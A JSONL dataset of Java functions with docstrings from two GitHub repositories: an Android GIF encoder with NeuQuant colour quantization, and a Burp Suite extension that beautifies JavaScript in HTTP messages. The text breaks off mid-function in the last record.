{"docstring": "/* Search for BGR values 0..255 (after net is unbiased) and return colour index\n   ---------------------------------------------------------------------------- */\n", "func_signal": "public int map(int b, int g, int r)", "code": "{\n \n\tint i, j, dist, a, bestd;\n\tint[] p;\n\tint best;\n \n\tbestd = 1000; /* biggest possible dist is 256*3 */\n\tbest = -1;\n\ti = netindex[g]; /* index on g */\n\tj = i - 1; /* start at netindex[g] and work outwards */\n \n\twhile ((i < netsize) || (j >= 0)) {\n\t\tif (i < netsize) {\n\t\t\tp = network[i];\n\t\t\tdist = p[1] - g; /* inx key */\n\t\t\tif (dist >= bestd)\n\t\t\t\ti = netsize; /* stop iter */\n\t\t\telse {\n\t\t\t\ti++;\n\t\t\t\tif (dist < 0)\n\t\t\t\t\tdist = -dist;\n\t\t\t\ta = p[0] - b;\n\t\t\t\tif (a < 0)\n\t\t\t\t\ta = -a;\n\t\t\t\tdist += a;\n\t\t\t\tif (dist < bestd) {\n\t\t\t\t\ta = p[2] - r;\n\t\t\t\t\tif (a < 0)\n\t\t\t\t\t\ta = -a;\n\t\t\t\t\tdist += a;\n\t\t\t\t\tif (dist < bestd) {\n\t\t\t\t\t\tbestd = dist;\n\t\t\t\t\t\tbest = p[3];\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif (j >= 0) {\n\t\t\tp = network[j];\n\t\t\tdist = g - p[1]; /* inx key - reverse dif */\n\t\t\tif (dist >= bestd)\n\t\t\t\tj = -1; /* stop iter */\n\t\t\telse {\n\t\t\t\tj--;\n\t\t\t\tif (dist < 0)\n\t\t\t\t\tdist = -dist;\n\t\t\t\ta = p[0] - b;\n\t\t\t\tif (a < 0)\n\t\t\t\t\ta = -a;\n\t\t\t\tdist += a;\n\t\t\t\tif (dist < bestd) {\n\t\t\t\t\ta = p[2] - r;\n\t\t\t\t\tif (a < 0)\n\t\t\t\t\t\ta = -a;\n\t\t\t\t\tdist += a;\n\t\t\t\t\tif (dist < bestd) {\n\t\t\t\t\t\tbestd = dist;\n\t\t\t\t\t\tbest = p[3];\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn (best);\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\NeuQuant.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Writes Image Descriptor\n */\n", "func_signal": "protected void writeImageDesc() throws IOException", "code": "{\n    out.write(0x2c); // image separator\n    writeShort(0); // image position x,y = 0,0\n    writeShort(0);\n    writeShort(width); // image size\n    writeShort(height);\n    // packed fields\n    if (firstFrame) {\n        // no LCT  - GCT is used for first (or only) frame\n        out.write(0);\n    } else {\n        // specify normal LCT\n        out.write(0x80 | // 1 local color table  1=yes\n                     0 | // 2 interlace - 0=no\n                     0 | // 3 sorted - 0=no\n                     0 | // 4-5 reserved\n               palSize); // 6-8 size of color table\n    }\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Sets quality of color quantization (conversion of images\n * to the maximum 256 colors allowed by the GIF specification).\n * Lower values (minimum = 1) produce better colors, but slow\n * processing significantly.  10 is the default, and produces\n * good color mapping at reasonable speeds.  Values greater\n * than 20 do not yield significant improvements in speed.\n *\n * @param quality int greater than 0.\n * @return\n */\n", "func_signal": "public void setQuality(int quality)", "code": "{\n    if (quality < 1) quality = 1;\n    sample = quality;\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/* Insertion sort of network and building of netindex[0..255] (to do after unbias)\n   ------------------------------------------------------------------------------- */\n", "func_signal": "public void inxbuild()", "code": "{\n \n\tint i, j, smallpos, smallval;\n\tint[] p;\n\tint[] q;\n\tint previouscol, startpos;\n \n\tpreviouscol = 0;\n\tstartpos = 0;\n\tfor (i = 0; i < netsize; i++) {\n\t\tp = network[i];\n\t\tsmallpos = i;\n\t\tsmallval = p[1]; /* index on g */\n\t\t/* find smallest in i..netsize-1 */\n\t\tfor (j = i + 1; j < netsize; j++) {\n\t\t\tq = network[j];\n\t\t\tif (q[1] < smallval) { /* index on g */\n\t\t\t\tsmallpos = j;\n\t\t\t\tsmallval = q[1]; /* index on g */\n\t\t\t}\n\t\t}\n\t\tq = network[smallpos];\n\t\t/* swap p (i) and q (smallpos) entries */\n\t\tif (i != smallpos) {\n\t\t\tj = q[0];\n\t\t\tq[0] = p[0];\n\t\t\tp[0] = j;\n\t\t\tj = q[1];\n\t\t\tq[1] = p[1];\n\t\t\tp[1] = j;\n\t\t\tj = q[2];\n\t\t\tq[2] = p[2];\n\t\t\tp[2] = j;\n\t\t\tj = q[3];\n\t\t\tq[3] = p[3];\n\t\t\tp[3] = j;\n\t\t}\n\t\t/* smallval entry is now in position i */\n\t\tif (smallval != previouscol) {\n\t\t\tnetindex[previouscol] = (startpos + i) >> 1;\n\t\t\tfor (j = previouscol + 1; j < smallval; j++)\n\t\t\t\tnetindex[j] = i;\n\t\t\tpreviouscol = smallval;\n\t\t\tstartpos = i;\n\t\t}\n\t}\n\tnetindex[previouscol] = (startpos + maxnetpos) >> 1;\n\tfor (j = previouscol + 1; j < 256; j++)\n\t\tnetindex[j] = maxnetpos; /* really 256 */\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\NeuQuant.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/* Search for biased BGR values\n   ---------------------------- */\n", "func_signal": "protected int contest(int b, int g, int r)", "code": "{\n \n\t/* finds closest neuron (min dist) and updates freq */\n\t/* finds best neuron (min dist-bias) and returns position */\n\t/* for frequently chosen neurons, freq[i] is high and bias[i] is negative */\n\t/* bias[i] = gamma*((1/netsize)-freq[i]) */\n \n\tint i, dist, a, biasdist, betafreq;\n\tint bestpos, bestbiaspos, bestd, bestbiasd;\n\tint[] n;\n \n\tbestd = ~(1 << 31);\n\tbestbiasd = bestd;\n\tbestpos = -1;\n\tbestbiaspos = bestpos;\n \n\tfor (i = 0; i < netsize; i++) {\n\t\tn = network[i];\n\t\tdist = n[0] - b;\n\t\tif (dist < 0)\n\t\t\tdist = -dist;\n\t\ta = n[1] - g;\n\t\tif (a < 0)\n\t\t\ta = -a;\n\t\tdist += a;\n\t\ta = n[2] - r;\n\t\tif (a < 0)\n\t\t\ta = -a;\n\t\tdist += a;\n\t\tif (dist < bestd) {\n\t\t\tbestd = dist;\n\t\t\tbestpos = i;\n\t\t}\n\t\tbiasdist = dist - ((bias[i]) >> (intbiasshift - netbiasshift));\n\t\tif (biasdist < bestbiasd) {\n\t\t\tbestbiasd = biasdist;\n\t\t\tbestbiaspos = i;\n\t\t}\n\t\tbetafreq = (freq[i] >> betashift);\n\t\tfreq[i] -= betafreq;\n\t\tbias[i] += (betafreq << gammashift);\n\t}\n\tfreq[bestpos] += beta;\n\tbias[bestpos] -= betagamma;\n\treturn (bestbiaspos);\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\NeuQuant.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/* Move adjacent neurons by precomputed alpha*(1-((i-j)^2/[r]^2)) in radpower[|i-j|]\n   --------------------------------------------------------------------------------- */\n", "func_signal": "protected void alterneigh(int rad, int i, int b, int g, int r)", "code": "{\n \n\tint j, k, lo, hi, a, m;\n\tint[] p;\n \n\tlo = i - rad;\n\tif (lo < -1)\n\t\tlo = -1;\n\thi = i + rad;\n\tif (hi > netsize)\n\t\thi = netsize;\n \n\tj = i + 1;\n\tk = i - 1;\n\tm = 1;\n\twhile ((j < hi) || (k > lo)) {\n\t\ta = radpower[m++];\n\t\tif (j < hi) {\n\t\t\tp = network[j++];\n\t\t\ttry {\n\t\t\t\tp[0] -= (a * (p[0] - b)) / alpharadbias;\n\t\t\t\tp[1] -= (a * (p[1] - g)) / alpharadbias;\n\t\t\t\tp[2] -= (a * (p[2] - r)) / alpharadbias;\n\t\t\t} catch (Exception e) {\n\t\t\t} // prevents 1.3 miscompilation\n\t\t}\n\t\tif (k > lo) {\n\t\t\tp = network[k--];\n\t\t\ttry {\n\t\t\t\tp[0] -= (a * (p[0] - b)) / alpharadbias;\n\t\t\t\tp[1] -= (a * (p[1] - g)) / alpharadbias;\n\t\t\t\tp[2] -= (a * (p[2] - r)) / alpharadbias;\n\t\t\t} catch (Exception e) {\n\t\t\t}\n\t\t}\n\t}\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\NeuQuant.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Sets the GIF frame disposal code for the last added frame\n * and any subsequent frames.  Default is 0 if no transparent\n * color has been set, otherwise 2.\n * @param code int disposal code.\n */\n", "func_signal": "public void setDispose(int code)", "code": "{\n    if (code >= 0) {\n        dispose = code;\n    }\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Encodes and writes pixel data\n */\n", "func_signal": "protected void writePixels() throws IOException", "code": "{\n    LZWEncoder encoder =\n        new LZWEncoder(width, height, indexedPixels, colorDepth);\n    encoder.encode(out);\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n *    Write 16-bit value to output stream, LSB first\n */\n", "func_signal": "protected void writeShort(int value) throws IOException", "code": "{\n    out.write(value & 0xff);\n    out.write((value >> 8) & 0xff);\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/* Unbias network to give byte values 0..255 and record position i to prepare for sort\n   ----------------------------------------------------------------------------------- */\n", "func_signal": "public void unbiasnet()", "code": "{\n \n\t@SuppressWarnings(\"unused\")\n\tint i, j;\n \n\tfor (i = 0; i < netsize; i++) {\n\t\tnetwork[i][0] >>= netbiasshift;\n\t\tnetwork[i][1] >>= netbiasshift;\n\t\tnetwork[i][2] >>= netbiasshift;\n\t\tnetwork[i][3] = i; /* record colour no */\n\t}\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\NeuQuant.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Adds next GIF frame.  The frame is not written immediately, but is\n * actually deferred until the next frame is received so that timing\n * data can be inserted.  Invoking <code>finish()</code> flushes all\n * frames.  If <code>setSize</code> was not invoked, the size of the\n * first image is used for all subsequent frames.\n *\n * @param im BufferedImage containing frame to write.\n * @return true if successful.\n */\n", "func_signal": "public boolean addFrame(Bitmap im)", "code": "{\n    if ((im == null) || !started) {\n        return false;\n    }\n    boolean ok = true;\n    try {\n        if (!sizeSet) {\n            // use first frame's size\n            setSize(im.getWidth(), im.getHeight());\n        }\n        image = im;\n        getImagePixels(); // convert to correct format if necessary\n        analyzePixels(); // build color table & map pixels\n        if (firstFrame) {\n            writeLSD(); // logical screen descriptior\n            writePalette(); // global color table\n            if (repeat >= 0) {\n                // use NS app extension to indicate reps\n                writeNetscapeExt();\n            }\n        }\n        writeGraphicCtrlExt(); // write graphic control extension\n        writeImageDesc(); // image descriptor\n        if (!firstFrame) {\n            writePalette(); // local color table\n        }\n        writePixels(); // encode and write pixel data\n        firstFrame = false;\n    } catch (IOException e) {\n        ok = false;\n    }\n \n    return ok;\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Analyzes image colors and creates color map.\n */\n", "func_signal": "protected void analyzePixels()", "code": "{\n    int len = pixels.length;\n    int nPix = len / 3;\n    indexedPixels = new byte[nPix];\n    NeuQuant nq = new NeuQuant(pixels, len, sample);\n    // initialize quantizer\n    colorTab = nq.process(); // create reduced palette\n    // convert map from BGR to RGB\n    for (int i = 0; i < colorTab.length; i += 3) {\n        byte temp = colorTab[i];\n        colorTab[i] = colorTab[i + 2];\n        colorTab[i + 2] = temp;\n        usedEntry[i / 3] = false;\n    }\n    // map image pixels to new palette\n    int k = 0;\n    for (int i = 0; i < nPix; i++) {\n        int index =\n            nq.map(pixels[k++] & 0xff,\n                   pixels[k++] & 0xff,\n                   pixels[k++] & 0xff);\n        usedEntry[index] = true;\n        indexedPixels[i] = (byte) index;\n    }\n    pixels = null;\n    colorDepth = 8;\n    palSize = 7;\n    // get closest match to transparent color if specified\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Sets frame rate in frames per second.  Equivalent to\n * <code>setDelay(1000/fps)</code>.\n *\n * @param fps float frame rate (frames per second)\n */\n", "func_signal": "public void setFrameRate(float fps)", "code": "{\n    if (fps != 0f) {\n        delay = Math.round(100f / fps);\n    }\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Writes color table\n */\n", "func_signal": "protected void writePalette() throws IOException", "code": "{\n    out.write(colorTab, 0, colorTab.length);\n    int n = (3 * 256) - colorTab.length;\n    for (int i = 0; i < n; i++) {\n        out.write(0);\n    }\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/* Main Learning Loop\n   ------------------ */\n", "func_signal": "public void learn()", "code": "{\n \n\tint i, j, b, g, r;\n\tint radius, rad, alpha, step, delta, samplepixels;\n\tbyte[] p;\n\tint pix, lim;\n \n\tif (lengthcount < minpicturebytes)\n\t\tsamplefac = 1;\n\talphadec = 30 + ((samplefac - 1) / 3);\n\tp = thepicture;\n\tpix = 0;\n\tlim = lengthcount;\n\tsamplepixels = lengthcount / (3 * samplefac);\n\tdelta = samplepixels / ncycles;\n\talpha = initalpha;\n\tradius = initradius;\n \n\trad = radius >> radiusbiasshift;\n\tif (rad <= 1)\n\t\trad = 0;\n\tfor (i = 0; i < rad; i++)\n\t\tradpower[i] =\n\t\t\talpha * (((rad * rad - i * i) * radbias) / (rad * rad));\n \n\t//fprintf(stderr,\"beginning 1D learning: initial radius=%d\\n\", rad);\n \n\tif (lengthcount < minpicturebytes)\n\t\tstep = 3;\n\telse if ((lengthcount % prime1) != 0)\n\t\tstep = 3 * prime1;\n\telse {\n\t\tif ((lengthcount % prime2) != 0)\n\t\t\tstep = 3 * prime2;\n\t\telse {\n\t\t\tif ((lengthcount % prime3) != 0)\n\t\t\t\tstep = 3 * prime3;\n\t\t\telse\n\t\t\t\tstep = 3 * prime4;\n\t\t}\n\t}\n \n\ti = 0;\n\twhile (i < samplepixels) {\n\t\tb = (p[pix + 0] & 0xff) << netbiasshift;\n\t\tg = (p[pix + 1] & 0xff) << netbiasshift;\n\t\tr = (p[pix + 2] & 0xff) << netbiasshift;\n\t\tj = contest(b, g, r);\n \n\t\taltersingle(alpha, j, b, g, r);\n\t\tif (rad != 0)\n\t\t\talterneigh(rad, j, b, g, r); /* alter neighbours */\n \n\t\tpix += step;\n\t\tif (pix >= lim)\n\t\t\tpix -= lengthcount;\n \n\t\ti++;\n\t\tif (delta == 0)\n\t\t\tdelta = 1;\n\t\tif (i % delta == 0) {\n\t\t\talpha -= alpha / alphadec;\n\t\t\tradius -= radius / radiusdec;\n\t\t\trad = radius >> radiusbiasshift;\n\t\t\tif (rad <= 1)\n\t\t\t\trad = 0;\n\t\t\tfor (j = 0; j < rad; j++)\n\t\t\t\tradpower[j] =\n\t\t\t\t\talpha * (((rad * rad - j * j) * radbias) / (rad * rad));\n\t\t}\n\t}\n\t//fprintf(stderr,\"finished 1D learning: final alpha=%f !\\n\",((float)alpha)/initalpha);\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\NeuQuant.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Flushes any pending data and closes output file.\n * If writing to an OutputStream, the stream is not\n * closed.\n */\n", "func_signal": "public boolean finish()", "code": "{\n    if (!started) return false;\n    boolean ok = true;\n    started = false;\n    try {\n        out.write(0x3b); // gif trailer\n        out.flush();\n        if (closeStream) {\n            out.close();\n        }\n    } catch (IOException e) {\n        ok = false;\n    }\n \n    // reset for subsequent use\n    transIndex = 0;\n    out = null;\n    image = null;\n    pixels = null;\n    indexedPixels = null;\n    colorTab = null;\n    closeStream = false;\n    firstFrame = true;\n \n    return ok;\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Sets the number of times the set of GIF frames\n * should be played.  Default is 1; 0 means play\n * indefinitely.  Must be invoked before the first\n * image is added.\n *\n * @param iter int number of iterations.\n * @return\n */\n", "func_signal": "public void setRepeat(int iter)", "code": "{\n    if (iter >= 0) {\n        repeat = iter;\n    }\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/* Move neuron i towards biased (b,g,r) by factor alpha\n   ---------------------------------------------------- */\n", "func_signal": "protected void altersingle(int alpha, int i, int b, int g, int r)", "code": "{\n \n\t/* alter hit neuron */\n\tint[] n = network[i];\n\tn[0] -= (alpha * (n[0] - b)) / initalpha;\n\tn[1] -= (alpha * (n[1] - g)) / initalpha;\n\tn[2] -= (alpha * (n[2] - r)) / initalpha;\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\NeuQuant.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Writes string to output stream\n */\n", "func_signal": "protected void writeString(String s) throws IOException", "code": "{\n    for (int i = 0; i < s.length(); i++) {\n        out.write((byte) s.charAt(i));\n    }\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "/**\n * Initiates writing of a GIF file with the specified name.\n *\n * @param file String containing output file name.\n * @return false if open or initial write failed.\n */\n", "func_signal": "public boolean start(String file)", "code": "{\n    boolean ok = true;\n    try {\n        out = new BufferedOutputStream(new FileOutputStream(file));\n        ok = start(out);\n        closeStream = true;\n    } catch (IOException e) {\n        ok = false;\n    }\n    return started = ok;\n}", "path": "GIFDroid\\src\\com\\quackware\\gifdroid\\encoder\\AnimatedGifEncoder.java", "repo_name": "curtislarson/GIFDroid", "stars": 102, "license": "None", "language": "java", "size": 18496}
{"docstring": "// Check the body of the request to not be a normal POST request\n", "func_signal": "private boolean isNormalPostMessage(String strBody)", "code": "{\n\tboolean result = false;\n\tif(!strBody.equals(\"\")){\n\t\t// We are only interested when there is a valid pair\n\t\tchar firstChar = strBody.charAt(0);\n\t\tchar lastChar = strBody.charAt(strBody.length()-1);\n\t\t\n\t\tif((firstChar =='{' ||  lastChar == '}') || (firstChar =='<' && lastChar == '>') || (firstChar =='[' && lastChar == ']') ||\n\t\t\t\t(firstChar =='(' && lastChar == ')')){\n\t\t\t// It seems valid to be beautified as it is not a normal POST message\n\t\t\tresult = false;\n\t\t}else{\n\t\t\t// It is a normal POST message? even multipart/form-data? \n\t\t\tresult = true;\n\t\t}\n\t}\n\treturn result;\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "/**\n * Constructs a new <code>UnicodeBOMInputStream</code> that wraps the\n * specified <code>InputStream</code>.\n * \n * @param inputStream an <code>InputStream</code>.\n * \n * @throws NullPointerException when <code>inputStream</code> is\n * <code>null</code>.\n * @throws IOException on reading from the specified <code>InputStream</code>\n * when trying to detect the Unicode BOM.\n */\n", "func_signal": "public UnicodeBOMInputStream(final InputStream inputStream) throws  NullPointerException,\nIOException", "code": "{\n\tif (inputStream == null)\n\t\tthrow new NullPointerException(\"invalid input stream: null is not allowed\");\n\n\tin = new PushbackInputStream(inputStream,4);\n\n\tfinal byte  bom[] = new byte[4];\n\tfinal int   read  = in.read(bom);\n\n\tswitch(read)\n\t{\n\tcase 4:\n\t\tif ((bom[0] == (byte)0xFF) &&\n\t\t\t\t(bom[1] == (byte)0xFE) &&\n\t\t\t\t(bom[2] == (byte)0x00) &&\n\t\t\t\t(bom[3] == (byte)0x00))\n\t\t{\n\t\t\tthis.bom = BOM.UTF_32_LE;\n\t\t\tbreak;\n\t\t}\n\t\telse\n\t\t\tif ((bom[0] == (byte)0x00) &&\n\t\t\t\t\t(bom[1] == (byte)0x00) &&\n\t\t\t\t\t(bom[2] == (byte)0xFE) &&\n\t\t\t\t\t(bom[3] == (byte)0xFF))\n\t\t\t{\n\t\t\t\tthis.bom = BOM.UTF_32_BE;\n\t\t\t\tbreak;\n\t\t\t}\n\n\tcase 3:\n\t\tif ((bom[0] == (byte)0xEF) &&\n\t\t\t\t(bom[1] == (byte)0xBB) &&\n\t\t\t\t(bom[2] == (byte)0xBF))\n\t\t{\n\t\t\tthis.bom = BOM.UTF_8;\n\t\t\tbreak;\n\t\t}\n\n\tcase 2:\n\t\tif ((bom[0] == (byte)0xFF) &&\n\t\t\t\t(bom[1] == (byte)0xFE))\n\t\t{\n\t\t\tthis.bom = BOM.UTF_16_LE;\n\t\t\tbreak;\n\t\t}\n\t\telse\n\t\t\tif ((bom[0] == (byte)0xFE) &&\n\t\t\t\t\t(bom[1] == (byte)0xFF))\n\t\t\t{\n\t\t\t\tthis.bom = BOM.UTF_16_BE;\n\t\t\t\tbreak;\n\t\t\t}\n\n\tdefault:\n\t\tthis.bom = BOM.NONE;\n\t\tbreak;\n\t}\n\n\tif (read > 0)\n\t\tin.unread(bom,0,read);\n}", "path": "jsbeautifier\\src\\burp\\JSBeautifier\\UnicodeBOMInputStream.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// Read the Content-Type value from the header\n", "func_signal": "private String findHeaderContentType(String strHeader)", "code": "{\n\tString contentType=\"\";\n\tif(!strHeader.equals(\"\")){\n\t\tPattern MY_PATTERN = Pattern.compile(\"(?im)^content-type:([\\\\ \\\\w\\\\/\\\\-\\\\_\\\\,]*)\"); // just in case, it also includes \",_ \" \n\t\tMatcher m = MY_PATTERN.matcher(strHeader);\n\t\tif (m.find()) {\n\t\t\tcontentType = m.group(1);\n\t\t}\n\t}\n\treturn contentType;\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// constructor\n", "func_signal": "public JSBeautifierFunctions(IBurpExtenderCallbacks mCallbacks, BeautifierPreferences beautifierPreferences)", "code": "{\n\tsuper();\n\tthis.msgType = -1;\n\tthis.mCallbacks = mCallbacks;\n\t// obtain an extension helpers object\n\tthis.helpers = mCallbacks.getHelpers();\n\tthis.beautifierPreferences = beautifierPreferences;\n\t// obtain our output stream\n\tstdout = new PrintWriter(mCallbacks.getStdout(), true);\n\tstderr = new PrintWriter(mCallbacks.getStderr(), true);\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// Check for Byte Order Mark (BOM) character ~ http://www.unicode.org/faq/utf_bom.html#BOM\n// split the text to two sections: [0]=BOM Character,[1]=Text without BOM character\n", "func_signal": "private String[] splitBOMCharacter(String strInput)", "code": "{\n\tString[] strResult = {\"\",\"\"};\n\tif (strInput == null)\n\t\treturn strResult;\n\n\tif(!strInput.equals(\"\")){\n\t\tfinal byte[] byteInput = strInput.getBytes();\n\t\tif(byteInput.length>4){\n\t\t\tif ((byteInput[0] == (byte)0xFF) &&\n\t\t\t\t\t(byteInput[1] == (byte)0xFE) &&\n\t\t\t\t\t(byteInput[2] == (byte)0x00) &&\n\t\t\t\t\t(byteInput[3] == (byte)0x00))\n\t\t\t{\n\t\t\t\tstrResult[0] = new String(BOM.UTF_32_LE.bytes);\n\n\n\t\t\t}\n\t\t\telse if ((byteInput[0] == (byte)0x00) &&\n\t\t\t\t\t(byteInput[1] == (byte)0x00) &&\n\t\t\t\t\t(byteInput[2] == (byte)0xFE) &&\n\t\t\t\t\t(byteInput[3] == (byte)0xFF))\n\t\t\t{\n\t\t\t\tstrResult[0]  = new String(BOM.UTF_32_BE.bytes);\n\n\t\t\t} else\t\t\t\tif ((byteInput[0] == (byte)0xEF) &&\n\t\t\t\t\t(byteInput[1] == (byte)0xBB) &&\n\t\t\t\t\t(byteInput[2] == (byte)0xBF))\n\t\t\t{\n\t\t\t\tstrResult[0]  = new String(BOM.UTF_8.bytes);\n\n\t\t\t}else if ((byteInput[0] == (byte)0xFF) &&\n\t\t\t\t\t(byteInput[1] == (byte)0xFE))\n\t\t\t{\n\t\t\t\tstrResult[0]  = new String(BOM.UTF_16_LE.bytes);\n\n\t\t\t}\n\t\t\telse\t\t\tif ((byteInput[0] == (byte)0xFE) &&\n\t\t\t\t\t(byteInput[1] == (byte)0xFF))\n\t\t\t{\n\t\t\t\tstrResult[0]  = new String(BOM.UTF_16_BE.bytes);\n\n\t\t\t}else{\n\n\t\t\t\tstrResult[0]  = \"\";\n\t\t\t}\n\t\t\tstrResult[1] = strInput.substring(strResult[0].length());\n\t\t}else{\n\t\t\tstrResult[1] = strInput; // this text is not important for us!\n\t\t}\n\t}\n\treturn strResult;\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// This function should be called in order to beautify a message\n", "func_signal": "public void beautifyIt(IHttpRequestResponse[] messageInfo, boolean isAuto,int msgType)", "code": "{\n\tthis.isAutomatic = isAuto;\n\tthis.msgType = msgType;\n\t//\t\tIRequestInfo analyzedReq = helpers.analyzeRequest(messageInfo[0]);\n\t//\t\tIResponseInfo analyzedResp = helpers.analyzeResponse(messageInfo[0].getResponse());\n\t//\t\t\n\tString[] requestHeaderAndBody = {\"\",\"\"};\n\tString[] responsetHeaderAndBody = {\"\",\"\"};\n\tString finalRequestHeaderAndBody = \"\";\n\tString finalResponsetHeaderAndBody = \"\";\n\tint messageState = 0;\n\tbyte[] request;\n\tbyte[] response;\n\n\ttry {\n\t\tswitch(msgType){\n\t\tcase 3:\n\t\tcase -1:\n\t\t\t// Implementing the message type\n\t\t\trequest = messageInfo[0].getRequest();\n\t\t\tresponse = messageInfo[0].getResponse(); \n\t\t\t// create array of Header and Body for Request and Response\n\t\t\trequestHeaderAndBody = getHeaderAndBody(request);\n\t\t\tresponsetHeaderAndBody = getHeaderAndBody(response);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tresponse = messageInfo[0].getResponse(); \n\t\t\tresponsetHeaderAndBody = getHeaderAndBody(response);\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\trequest = messageInfo[0].getRequest();\n\t\t\trequestHeaderAndBody = getHeaderAndBody(request);\n\t\t\tbreak;\n\t\t}\n\n\n\t\tif(msgType==-1){\n\t\t\tif (beautifierPreferences.isDebugMode())\n\t\t\t\tstdout.println(\"Decision Decision... msgType is -1\");\n\t\t\tif(!requestHeaderAndBody[1].equals(\"\") && !responsetHeaderAndBody[1].equals(\"\") && !isNormalPostMessage(requestHeaderAndBody[1]) && !isAutomatic){\n\t\t\t\tString[] options = {\"Only on response\", \"Only on request\", \"On both\", \"Cancel\"};\n\t\t\t\tint n = askConfirmMessage(\"Please choose an option:\", \"Response and Request are available, do you want to run beautifier?\",options);\n\t\t\t\tswitch(n){\n\t\t\t\tcase 0:\n\t\t\t\t\tif (beautifierPreferences.isDebugMode())\n\t\t\t\t\t\tstdout.println(\"It is a response\");\n\t\t\t\t\tmsgType = 2; // It is a response\n\t\t\t\t\tbreak;\n\t\t\t\tcase 1:\n\t\t\t\t\tif (beautifierPreferences.isDebugMode())\n\t\t\t\t\t\tstdout.println(\"It is a request\");\n\t\t\t\t\tmsgType = 1; // It is a request\n\t\t\t\t\tbreak;\n\t\t\t\tcase 2:\n\t\t\t\t\tif (beautifierPreferences.isDebugMode())\n\t\t\t\t\t\tstdout.println(\"It is a request and a response!\");\n\t\t\t\t\tmsgType = 3; // It is both!\n\t\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\tif (beautifierPreferences.isDebugMode())\n\t\t\t\t\t\tstdout.println(\"User canceled the operation!\");\n\t\t\t\t\tmsgType=0; // Cancel! Then 